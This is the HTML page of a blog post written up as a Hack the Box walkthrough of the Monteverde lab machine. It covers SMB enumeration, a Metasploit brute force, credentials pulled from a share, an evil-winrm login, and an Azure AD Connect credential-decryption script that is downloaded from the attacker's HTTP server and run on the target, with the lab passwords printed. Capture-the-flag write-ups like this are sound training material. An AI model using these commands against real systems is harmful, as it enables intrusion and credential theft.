@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Introduction IP: 10.10.10.172 Difficulty: Easy
+This is my write-up for the Hack the Box machine Monteverde.
+Initial nmap Scan Running the inital nmap scan:
+nmap -sV -sC -p- -oN nmap 10.10.10.172
+Yielded the following results:
+From here, you can see that there are 18 open ports and that the windows is running on windows.
+Ports That Stand Out   Port 389 - shows that there&#39;s an Active Directory domain named MEGABANK present on the system which may become useful later." />
+<meta name="keywords" content="homepage, hacking, ctf, htb, hack, box, programming, blog, informatics, osint, ethical" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://xyniath.github.io/write-ups/monteverde/" />
+
+
+    <title>
+        
+            Monteverde :: Xyniath  — Hacking and stuff
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css">
+
+
+
+
+<meta itemprop="name" content="Monteverde">
+<meta itemprop="description" content="Write-up for the Monteverde Machine from Hack the Box">
+<meta itemprop="datePublished" content="2020-01-21T08:23:07&#43;00:00" />
+<meta itemprop="dateModified" content="2020-01-21T08:23:07&#43;00:00" />
+<meta itemprop="wordCount" content="1004">
+<meta itemprop="image" content="https://xyniath.github.io/"/>
+
+
+
+<meta itemprop="keywords" content="Azure,Easy,Hack the Box,Write-up,Walkthrough,SMB,Brute-Force,Powershell,Windows,Enumeration,Real-Life,CVE," /><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://xyniath.github.io/"/>
+
+<meta name="twitter:title" content="Monteverde"/>
+<meta name="twitter:description" content="Write-up for the Monteverde Machine from Hack the Box"/>
+
+
+
+
+
+    <meta property="article:published_time" content="2020-01-21 08:23:07 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd ~/home/xyniath</span>
+            <span class="logo__cursor" style=""></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://xyniath.github.io/about-me/">About Me</a></li><li><a href="https://xyniath.github.io/blog/">Blog</a></li><li><a href="https://xyniath.github.io/write-ups/">Write-Ups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://xyniath.github.io/write-ups/monteverde/">Monteverde</a></h2>
+
+            
+
+            <div class="post-content">
+                <h2 id="introduction">Introduction</h2>
+<p><strong>IP</strong>: 10.10.10.172
+<strong>Difficulty</strong>: Easy</p>
+<p>This is my write-up for the Hack the Box machine Monteverde.</p>
+<h2 id="initial-nmap-scan">Initial nmap Scan</h2>
+<p>Running the inital <code>nmap</code> scan:</p>
+<p><code>nmap -sV -sC -p- -oN nmap 10.10.10.172</code></p>
+<p>Yielded the following results:</p>
+<p><img src="/posts/monteverde/nmapscan.png" alt="Nmap Scan"></p>
+<p>From here, you can see that there are 18 open ports and that the windows is running on windows.</p>
+<h3 id="ports-that-stand-out">Ports That Stand Out</h3>
+<ul>
+<li>
+<p><strong>Port 389</strong> - shows that there's an Active Directory domain named MEGABANK present on the system which may become useful later.</p>
+</li>
+<li>
+<p><strong>Port 445</strong> - Stands out as its used generally for windows SMB protocol, furthering the significance of this results, we also see host script results on this protocol showing us the smb security mode as 2.02.</p>
+</li>
+<li>
+<p><strong>Port 5985</strong> - Showing a http server, hosting a &ldquo;Document not found&rdquo; page. This port used for Windows Server management.</p>
+</li>
+</ul>
+<h2 id="enumeration-of-smb-protocol">Enumeration of SMB Protocol</h2>
+<p>I decided to start off by enumerating the smb protocol on the machine, I did this by running another nmap scan with <code>-A</code>.</p>
+<p><img src="/posts/monteverde/smbportscan.png" alt="Nmap Scan"></p>
+<p>Here, after the scan, it now states that the security mode is actually 3.00 as opposed to the 2.02 as previously discovered.</p>
+<p>I then used enum4linux to enumerate the system
+<code>enum4linux -U 10.10.10.172</code></p>
+<p><img src="/posts/monteverde/enum4linuxdomainsid.png" alt="Domain SID">
+<strong>Domain Name</strong> - MEGABANK
+And also list of the users present on the system
+<img src="/posts/monteverde/enum4linuxusers.png" alt="Users"></p>
+<p><strong>Users</strong> - Guest, AAD_987d7f2f57d2, mhope, smorgan, dgalanos, roleary, SABatchJobs, svc-ata, svc-bexec &amp; svc-netapp</p>
+<p>AAD_987d7f2f57d2 seemed interesting, and after research into this type of user, shows that there's an Azure Active Directory on the machine.</p>
+<h2 id="brute-forcing-the-smb-login">Brute-Forcing the SMB Login</h2>
+<p>After finding a list of users on the machine and that the SMB protocol was open, I could potentially launch a brute-force login attempt on the machine.</p>
+<p>To do this, I used the Metasploit module (auxiliary/scanner/smb/smb_login) for this, as I tried THC Hydra but it didn't seem to work for me.</p>
+<p>At first, I tried using the <em>user-style</em> accounts: mhope, smorgan, dgalanos and roleary to no success.</p>
+<p>I then decided to use SABatchJobs next. Using BLANK_PASSWORDS and USER_AS_PASS both set to true.
+<img src="/posts/monteverde/batchjobsbforce.png" alt="SABatchJobs Brute-Force"></p>
+<p>As soon as I started the exploit, the password was found instantly.
+<img src="/posts/monteverde/sabatchcreds.png" alt="SABatchJobs Credentials">
+<strong>User</strong>: SABatchJobs</p>
+<p><strong>Pass</strong>: SABatchJobs</p>
+<h2 id="enumerating-the-smb-shares">Enumerating the SMB Shares</h2>
+<p>To enumerate the SMB shares, I used <code>smbclient</code></p>
+<p><code>smbclient -L 10.10.10.172 -U SABatchJobs</code></p>
+<p><img src="/posts/monteverde/smbshares.png" alt="SMB shares"></p>
+<p>A particular share that interests me is named <strong>azure_uploads</strong>. So I ran:</p>
+<p><code>smbclient //10.10.10.172/azure_uploads</code></p>
+<p><img src="/posts/monteverde/smbazureuploads.png" alt="SMB azure_uploads">
+But didn't come across anything in the folder</p>
+<p>Most of the directories seemed empty (or I didn't have permission to view them) or didn't have any useful files in apart from the <strong>$users</strong> share.</p>
+<p><img src="/posts/monteverde/smbusers.png" alt="SMB users$"></p>
+<p>All the directories in the <strong>users$</strong> share were empty apart from <strong>mhope</strong> which contained one file named <strong>azure.xml</strong>.</p>
+<p>In order to view this file, I used <code>get azure.xml</code> which downloaded the file to the directory in which I used the <code>smbclient</code> command.</p>
+<p>The <strong>azure.xml</strong> looked like this:</p>
+<p><img src="/posts/monteverde/azurexml.png" alt="azure.xml"></p>
+<p>As you can see, there's a password here: <strong>4n0therD4y@n0th3r$</strong>.</p>
+<p>I assumed this was the password for the user <strong>mhope</strong>.</p>
+<p><strong>User</strong> - mhope</p>
+<p><strong>Pass</strong> - 4n0therD4y@n0th3r$</p>
+<h2 id="accessing-the-machine--getting-user-flag">Accessing the Machine &amp; Getting User Flag</h2>
+<p>To access the machine, I used <strong>Wvil-WinRM</strong>.</p>
+<p>I chose this because the server is using <strong>Windows Server Management</strong> on <strong>port 5985</strong>.</p>
+<p>You can install <strong>Evil-WinRM</strong> using <code>gem install evil-winrm</code>.</p>
+<p>To gain access to the machine:
+<code>evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$</code></p>
+<p><img src="/posts/monteverde/evilwinrm.png" alt="Evil-WinRM"></p>
+<p>I then had a shell on the machine! (Specifically PowerShell).</p>
+<p>Navigating to the Desktop folder, on the user showed the user.txt flag. On a Windows machine using <code>type user.txt</code> will print the flag to the screen.</p>
+<h2 id="getting-root">Getting Root</h2>
+<p>This part of the box proved to be the most difficult.</p>
+<p>Getting root took me a very long time, with a lot of potential exploits being detected by an antivirus present on the system.</p>
+<p>Without doing any <em>real</em> enumeration, I tried to get a shell from using a msfvenom payload by hosting it on a server, download it from the machine, and then run it. However an error in relation to Anti-Virus detection occurred.
+<img src="/posts/monteverde/averror.png" alt="Anti-Virus Error"></p>
+<p>I then tried again, by encoding the payload once, then twice, and unfortunately still didn't work.</p>
+<p>Mimikatz - commonly ussed to steal credentials and escalate privileges (<em>unsurprisingly</em>) was also detected by the AV.</p>
+<p>The Anti-Virus restricted a lot I could do, so my next steps were to see if there were any ways I could bypass it via disabling it, etc. But I couldn't find much.</p>
+<p>At this point, I started to enumerate. <strong>WinEnum</strong> didn't produce any output on the terminal and was just stuck, so I looked around the system to see what I could find. Checking directories that may seem interesting. In an AppData directory I came across a file credentials file but didn't have much information.</p>
+<p>Aftr not finding anything for a while, I took a break and came back and forgot the server was running an <strong>Azure Active Directory</strong> (With the user <strong>AAD_987d7f2f57d2</strong>) And through exploitation of this I could potentially get privesc.</p>
+<p>Looking into AAD exploits, I came across this <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/"><strong>blog post</strong></a> by Adam Chester (XPN).</p>
+<p>This provided some valuable information and a PowerShell script (.ps1) file, which needed to be edited to exploit this machine linked <a href="https://gist.githubusercontent.com/xpn/0dc393e944d8733e3c63023968583545/raw/28723eb269eafff5168b31ba1ea4722171d50af7/azuread_decrypt_msol.ps1"><strong>here.</strong></a></p>
+<p>Discovering what to do in terms of changing values in this file, took a long while.</p>
+<p>Until (After <em><strong>MANY</strong></em> iterations, eliciation and enumerations) I found several fixes:</p>
+<ul>
+<li>Changing the 3rd line in the script to this:
+<code>$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &quot;Data Source=.;Initial Catalog=ADSync;trusted_connection=true;&quot;</code></li>
+<li>Removing the 1st line of code</li>
+<li>Re-entering the apostrophe at the end of the line starting with <code>add-type -path</code> (as it wasn't a valid apostrophe and caused syntax errors)</li>
+</ul>
+<p>I then set up a HTTP Server on my machine with <code>python -m SimpleHTTPServer 80</code>.</p>
+<p>And then proceeded to download this file to the Monteverde Machine using PowerShell
+<code>Invoke-WebRequest -Uri hostserverip/azuread_decrypt_msol.ps1 -OutFile script.ps1</code>.</p>
+<p><img src="/posts/monteverde/scriptdownload.png" alt="Downloading Script"></p>
+<p>Then I ran the script with <code>.\script.ps1</code>.</p>
+<p><img src="/posts/monteverde/admincreds.png" alt="Administrator Credentials"></p>
+<p>And we got the Administrator password!</p>
+<p><strong>User</strong> - administrator
+<strong>Pass</strong> - d0m@in4dminyeah!</p>
+<p>After getting these credentials, I then ended my <strong>Evil-WinRM</strong> session on <strong>mhope</strong> and restarted using the admin user and password.</p>
+<p><img src="/posts/monteverde/root.png" alt="Root"></p>
+<p>And that's <strong>root!</strong></p>
+<h2 id="what-i-learnt-from-this-box">What I Learnt From This Box</h2>
+<ul>
+<li>SMB enumeration</li>
+<li>SMB brute-forcing</li>
+<li>Azure Active Directory knowledge</li>
+<li>Persistence</li>
+<li>Win-RM</li>
+<li>Working with PowerShell scripts</li>
+</ul>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+  				<p>
+  					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://xyniath.github.io/tags/azure">Azure</a></span><span class="tag"><a href="https://xyniath.github.io/tags/easy">Easy</a></span><span class="tag"><a href="https://xyniath.github.io/tags/hack-the-box">Hack the Box</a></span><span class="tag"><a href="https://xyniath.github.io/tags/write-up">Write-up</a></span><span class="tag"><a href="https://xyniath.github.io/tags/walkthrough">Walkthrough</a></span><span class="tag"><a href="https://xyniath.github.io/tags/smb">SMB</a></span><span class="tag"><a href="https://xyniath.github.io/tags/brute-force">Brute-Force</a></span><span class="tag"><a href="https://xyniath.github.io/tags/powershell">Powershell</a></span><span class="tag"><a href="https://xyniath.github.io/tags/windows">Windows</a></span><span class="tag"><a href="https://xyniath.github.io/tags/enumeration">Enumeration</a></span><span class="tag"><a href="https://xyniath.github.io/tags/real-life">Real-Life</a></span><span class="tag"><a href="https://xyniath.github.io/tags/cve">CVE</a></span>
+  				</p>
+  			</div>
+
+        
+    </main>
+
+            </div>
+
+            
+                <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta http-equiv="Content-Style-Type" content="text/css">
+  <title></title>
+  <meta name="Generator" content="Cocoa HTML Writer">
+  <meta name="CocoaVersion" content="1894.2">
+  <style type="text/css">
+  </style>
+</head>
+<body>
+</body>
+</html>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>
+
+
+
+    </body>
+</html>
